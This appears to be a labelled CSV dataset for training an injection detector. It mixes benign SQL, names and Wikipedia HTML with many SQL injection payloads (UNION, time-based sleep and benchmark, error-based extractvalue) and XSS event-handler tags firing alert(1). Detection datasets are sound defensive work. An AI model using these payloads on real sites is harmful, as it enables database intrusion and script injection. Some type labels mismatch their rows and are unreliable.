Text,Label,type
"<style>@keyframes slidein {}</style><source style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></source>",2,xss
"  SELECT shape,bet FROM milk WHERE grabbed = 'everyone' UNION SELECT mathematics, voyage FROM torn",0,sql
SELECT * FROM classroom WHERE apple NOT LIKE '[fun]%',0,xss
admin' or '1'  =  '1'#,1,sql
SELECT * FROM common ORDER BY should DESC,0,sql
desans totohuetotzint,0,xss
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",1,sql
"1 where 2674  =  2674 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,xss
SELECT * FROM vowel WHERE engine LIKE '%powerful%',0,sql
68689912k,0,xss
"<li><span class=""nowrap""><a href=""/wiki/Integrated_Authority_File"" title=""Integrated Authority File"">GND </a>: <span class=""uid""><a rel=""nofollow"" class=""external text"" href=""https://d-nb.info/gnd/4033447-8"">4033447-8 </a> ",0,xss
 </li>,0,xss
"<sup onmouseleave=""alert(1)"">test</sup>",2,xss
lanae,0,sql
"tYPE=""text/x-scriptlet"" DATA=""http://.rocks/scriptlet.html",2,xss
kovacs,0,sql
SELECT * FROM complete WHERE ride NOT BETWEEN 'proper' AND 'fall',0,sql
shupe,0,sql
band@casadedurcal.bi,0,sql
"<base oncontextmenu=""alert(1)"">test</base>",2,xss
"   SELECT COUNT ( happily ) , lungs FROM else BY name",0,sql
 </li>,0,xss
"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,1,sql
"document.getElementsByName("""")",2,xss
"joaquin verdaguer, 183",0,sql
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",1,sql
SELECT * FROM write,0,sql
SELECT * FROM seven ORDER BY swung,0,sql
"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",1,sql
" SELECT RIGHT ( CustomerName, 5 )  AS ExtractString FROM Customers;",0,sql
"<li><a href=""/wiki/Operations_research"" title=""Operations research"">Operations research </a> </li>",0,xss
1'+  (  select zwsr where 6567  =  6567,1,sql
"	 </span> <span class=""toctext"">Applications ",0,xss
-6203'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'luee'  =  'luee,1,sql
"<li><cite id=""CITEREFFearn2007"" class=""citation book"">Fearn, Nicholas (2007). <i>The Latest Answers to the Oldest Questions: A Philosophical Adventure with the World's Greatest Thinkers </i>. New York: Grove Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-8021-1839-4"" title=""Special:BookSources/978-0-8021-1839-4""><bdi>978-0-8021-1839-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Latest+Answers+to+the+Oldest+Questions%3A+A+Philosophical+Adventure+with+the+World%27s+Greatest+Thinkers&amp;rft.place=New+York&amp;rft.pub=Grove+Press&amp;rft.date=2007&amp;rft.isbn=978-0-8021-1839-4&amp;rft.aulast=Fearn&amp;rft.aufirst=Nicholas&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"CREATE TABLE IF NOT EXISTS `zcf_submitlogs`  (  `id` int ( 6 )  unsigned NOT NULL AUTO_INCREMENT, `crmsubmitlogStatus` varchar ( 20 )  DEFAULT NULL, `crmsubmitlogDescribtion` longtext NOT NULL, `crmsubmitFormType` varchar ( 30 )  NOT NULL, PRIMARY KEY  (  id  )   )  ENGINE = InnoDB DEFAULT CHARSET = utf8",0,sql
SELECT * FROM mighty WHERE least NOT LIKE '[war]%',0,xss
 </div>,0,xss
SELECT COUNT ( DISTINCT six )  FROM enemy,0,sql
SELECT bottle FROM boy,0,xss
DELETE FROM sister,0,sql
arajol lo cascio,0,xss
"1'||  (  select 'frrk' from dual where 3145  =  3145 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1,sql
SELECT * FROM whole WHERE mouth = 'trap',0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0,xss
16813,0,sql
"<a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Planning </a>:",0,xss
" SELECT Orders.OrderID, Employees.LastName, Employees.FirstName FROM Orders RIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID  ORDER BY Orders.OrderID;",0,xss
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",2,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",1,sql
"   SELECT Employees.sick, COUNT ( Orders.liftID )  AS coupleFROM    ( OrdersINNER JOIN kind ON Orders.factID  =  Employees.courseID ) ",0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"<li><a href=""/wiki/Behavior_selection_algorithm"" title=""Behavior selection algorithm"">Behavior selection algorithm </a> </li>",0,xss
SELECT TOP 3 * FROM disappear,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
tierra 17,0,sql
<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>,2,xss
"1' where 6953  =  6953 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eomt'  =  'eomt",1,xss
-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,sql
19310,0,sql
oficios$o,0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,xss
guindo vive,0,sql
<a id=x tabindex=1 onactivate=alert(1)></a>,2,xss
"1"" where 8089  =  8089",1,sql
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  9505  =  9505,1,sql
"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>",2,xss
SELECT * FROM invented WHERE Price NOT BETWEEN 10 AND 20,0,sql
"<li><a href=""/wiki/General-purpose_computing_on_graphics_processing_units"" title=""General-purpose computing on graphics processing units"">GPGPU </a> </li>",0,xss
"1',  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1,sql
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
"<li><a href=""/wiki/Numerical_analysis"" title=""Numerical analysis"">Numerical analysis </a> </li> </ul>",0,xss
SELECT * FROM sort WHERE riding = 'discover'  AND City = 'life',0,sql
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1,sql
SELECT * FROM add WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0,xss
-7562  )   or 8571  =  8571--,1,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;939 </li> </ul>",0,xss
"<ol onclick=""alert(1)"">test</ol>",2,xss
SELECT * FROM product WHERE NOT closely = 'lion'  AND NOT far = 'sink',0,sql
"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",2,xss
	 </span> </h3>,0,xss
30555153k,0,sql
"  SELECT able,principal,sing FROM dear LEFT JOIN Orders ON silly.presidentID =  successful.came ORDER BY harbor.load",0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Woody_Evans"" title=""Woody Evans"">Evans, Woody </a> (2015). ""Posthuman Rights: Dimensions of Transhuman Worlds"". <i>Teknokultura </i>. <b>12 </b> (2). <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072"">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # urzg",1,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",1,sql
-3982   )    )    or 6872  =  6872 and    (    (   6331  =  6331,1,sql
"<h4><span class=""mw-headline"" id=""Autonomous_weapons"">Autonomous weapons ",0,xss
"caada de los ingleses, 117,",0,sql
SELECT foreign ( s )  FROM expect,0,sql
"1   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   8048  =  8048",1,sql
"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",2,xss
"<body onresize=""alert(1)"">",2,xss
1 waitfor delay '0:0:5'# opyp,1,sql
atolera,0,sql
"<li><a href=""/wiki/Functionalism_(philosophy_of_mind)"" title=""Functionalism (philosophy of mind)"">Functionalism </a> </li>",0,xss
"1""  )   as pobe where 1704  =  1704",1,sql
SELECT difficulty ( s )  FROM strength LEFT JOIN,0,sql
SELECT bowl ( s )  FROM piano,0,sql
SELECT * FROM news WHERE again NOT LIKE 'important%',0,sql
1.86E+15,0,xss
"INSERT INTO bus ( worry, voice, melted, express, shore, individual )  VALUES  ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )  ",0,sql
"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '%'  =  '",1,sql
comerma crdoba,0,sql
"SELECT * FROM happy WHERE vessels BETWEEN ""teach"" AND    ""slow""",0,sql
donadio_honig@donkr.zr,0,sql
"SELECT ADDDATE ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",0,sql
"  SELECT * FROM tide WHERE pie IN  ( 'particles', 'count', 'knife' )  ",0,sql
	 </span> ,0,xss
llombai,0,sql
"1%' union all select null,null#",1,sql
"1  )   where 5615  =  5615 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,sql
"	 </span> <span class=""reference-text""><cite id=""CITEREFTuring1948"" class=""citation""><a href=""/wiki/Alan_Turing"" title=""Alan Turing"">Turing, Alan </a> (1948), ""Machine Intelligence"",  in Copeland, B. Jack (ed.), <i>The Essential Turing: The ideas that gave birth to the computer age </i>, Oxford: Oxford University Press, p.&#160;412, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-19-825080-7"" title=""Special:BookSources/978-0-19-825080-7""><bdi>978-0-19-825080-7 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Machine+Intelligence&amp;rft.btitle=The+Essential+Turing%3A+The+ideas+that+gave+birth+to+the+computer+age&amp;rft.place=Oxford&amp;rft.pages=412&amp;rft.pub=Oxford+University+Press&amp;rft.date=1948&amp;rft.isbn=978-0-19-825080-7&amp;rft.aulast=Turing&amp;rft.aufirst=Alan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM will FETCH FIRST 3 ROWS ONLY,0,sql
albiol,0,sql
"<li><a href=""/wiki/Philosophy_of_perception"" title=""Philosophy of perception"">Perception </a> </li>",0,xss
<slot onpointerover=alert(1)>XSS</slot>,2,xss
"<data onmouseout=""alert(1)"">test</data>",2,xss
SELECT simple ( s ) FROM court INNER JOIN,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_doing_cron' LIMIT 1,0,sql
<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>,2,xss
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationstart=""alert(1)""></strike>",2,xss
"  SELECT * FROM primitive WHERE coming IN  ( 'either', 'draw', 'queen' )  ",0,sql
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""xeki"" like ""xeki",1,xss
goertzen,0,sql
aloguer,0,sql
raab,0,sql
"  SELECT world AS hide, youth AS [flat]  FROM brave",0,sql
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,sql
rains8,0,sql
 </li>,0,xss
SELECT equator,0,sql
gabbai,0,xss
	 </span> </li>,0,xss
	 </span> </li>,0,xss
like,1,sql
SELECT COUNT ( valueID ) FROM he,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spiders.html"">Spiders</a></li>",0,xss
SELECT * FROM win FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cut,0,sql
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg",1,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT AVG ( habit ) FROM ago SELECT SUM ( manner ) ,0,xss
"SELECT * FROM put WHERE copper BETWEEN ""according"" AND    ""cream""",0,sql
2066,0,sql
"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
SELECT * FROM reason FETCH FIRST 3 ROWS ONLY,0,sql
7.66646E+15,0,xss
SELECT MIN ( using )  AS rays FROM later,0,sql
37711,0,sql
"  SELECT mix,iron FROM least WHERE rear = 'terrible' UNION SELECT railroad, everybody FROM is",0,sql
1  )   as hggi where 6511  =  6511,1,sql
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,sql
"1%""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,xss
SELECT COUNT ( both ) FROM divide,0,sql
96639593x,0,sql
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",1,sql
 UPDATE paper SET damage = 'stood'WHERE behavior = 'drawn',0,xss
73361115q,0,xss
"1%'  )   union all select null,null,null,null,null,null,null,null#",1,sql
"   SELECT choice, corn, struck FROM major WHERE machine  IS NULL",0,sql
SELECT COUNT ( DISTINCT breakfast )  FROM pleasant,0,sql
"1'  )   as ssxj where 3845  =  3845 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Hernández-Orallo, José; Dowe, David L.; Hernández-Lloreda, M.Victoria (March 2014). ""Universal psychometrics: Measuring cognitive abilities in the machine kingdom"". <i>Cognitive Systems Research </i>. <b>27 </b>: 50–74. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2013.06.001"">10.1016/j.cogsys.2013.06.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/10251%2F50244"">10251/50244 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=Universal+psychometrics%3A+Measuring+cognitive+abilities+in+the+machine+kingdom&amp;rft.volume=27&amp;rft.pages=50-74&amp;rft.date=2014-03&amp;rft_id=info%3Ahdl%2F10251%2F50244&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2013.06.001&amp;rft.aulast=Hern%C3%A1ndez-Orallo&amp;rft.aufirst=Jos%C3%A9&amp;rft.au=Dowe%2C+David+L.&amp;rft.au=Hern%C3%A1ndez-Lloreda%2C+M.Victoria&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT TOP 3 * FROM stood SELECT * FROM brick 3SELECT * FROM crack,0,sql
"1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sql
SELECT COUNT (  column_name  )  FROM table_name WHERE condition ;,0,xss
-5313'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'wkkp' like 'wkkp,1,sql
"<picture><source srcset=""validimage.png""><img onloadstart=alert(1)></picture>",2,xss
"<a href=""/wiki/Speech_recognition"" title=""Speech recognition"">Speech recognition </a>:",0,xss
troule politi,0,sql
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp",1,sql
"<body onmousedown=""alert(1)"">test</body>",2,xss
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,1,sql
<input4 onpointerout=alert(1)>XSS</input4>,2,xss
<meta id=x tabindex=1 onfocus=alert(1)></meta>,2,xss
